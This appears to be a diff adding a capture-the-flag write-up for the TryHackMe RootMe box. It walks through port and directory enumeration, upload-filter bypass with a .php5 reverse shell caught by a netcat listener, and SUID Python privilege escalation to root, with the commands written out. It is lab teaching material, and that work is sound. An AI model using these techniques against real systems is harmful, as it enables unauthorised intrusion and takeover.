@@ -1,0 +1,112 @@
+# 🚩 TryHackMe: RootMe Write-up
+
+
+## 📝 Executive Summary
+**RootMe** is a beginner-level CTF challenge hosted on TryHackMe. 
+The objective is to capture user and root flags. The exploitation involves web directory enumeration, 
+bypassing file upload restrictions using file extension manipulation, 
+and privilege escalation via a misconfigured SUID binary (Python).
+
+---
+
+## 🛠️ Tools Used
+- **Nmap**: Network discovery and service enumeration.
+- **FFUF**: Web directory fuzzing.
+- **Burp Suite / Browser**: Manual web interaction.
+- **Netcat**: Handling reverse shell connections.
+
+---
+
+## 1. Reconnaissance
+
+### Nmap Scan
+I started by scanning all ports to identify running services.
+
+```bash
+nmap -p- -sV <TARGET_IP>
+Results:
+
+Port 22: SSH (OpenSSH 7.6p1)
+
+Port 80: HTTP (Apache 2.4.41)
+
+2. Web Enumeration
+Since port 80 was open, I enumerated hidden directories using ffuf and the SecLists wordlist.
+
+Bash
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<TARGET_IP>/FUZZ -fc 404
+Findings:
+
+/panel (File upload page)
+
+/uploads (Directory where files are stored)
+
+3. Initial Access (The Shell)
+Analyzing the Upload Form
+I navigated to http://<TARGET_IP>/panel and found a file upload functionality. My goal was to upload a PHP reverse shell.
+
+Filter Evasion Attempts
+The server had an extension blacklist in place. I attempted several methods to bypass it:
+
+Standard PHP: .php (Blocked)
+
+Case Manipulation: .Php, .pHP (Blocked)
+
+Double Extensions: shell.png.php (Blocked)
+
+Magic Bytes: Added PNG headers (\x89\x50\x4E\x47...) to mimic an image. (Blocked)
+
+.htaccess: Tried uploading a malicious .htaccess to execute .png as php. The upload worked, but the server didn't execute the payload.
+
+Successful Bypass (.php5)
+I hypothesized that the blacklist might miss less common PHP extensions. I renamed my reverse shell payload (from /usr/share/webshells/php/php-reverse-shell.php) to .php5.
+
+Bash
+
+cp /usr/share/webshells/php/php-reverse-shell.php rev.php5
+# Edited the file to add my TUN0 IP and Port 1234
+I uploaded rev.php5 and it was accepted.
+
+Getting the Shell
+Started a Netcat listener:
+
+Bash
+
+nc -lvnp 1234
+Navigated to the file location: http://<TARGET_IP>/uploads/rev.php5
+
+I received a connection back!
+
+Bash
+
+$ whoami
+www-data
+User Flag: Located at /var/www/user.txt.
+
+4. Privilege Escalation
+SUID Enumeration
+I searched for binaries with the SUID bit set to elevate privileges.
+
+Bash
+
+find / -user root -perm -4000 -print 2>/dev/null
+Output: I noticed /usr/bin/python2 in the list. This is a standard binary which can be exploited if SUID is enabled.
+
+Exploitation via GTFOBins
+According to GTFOBins, we can spawn a root shell using Python by importing the os module.
+
+Bash
+
+/usr/bin/python2 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+Result: The prompt changed to #. I was effectively Root.
+
+Bash
+
+# whoami
+root
+# cat /root/root.txt
+🏁 Conclusion
+This box highlighted the importance of securing file upload forms not just against .php, 
+but against all executable extensions (like .php5, .phtml). Furthermore, leaving standard binaries like python with SUID permissions is a critical vulnerability 
+that allows trivial privilege escalation.
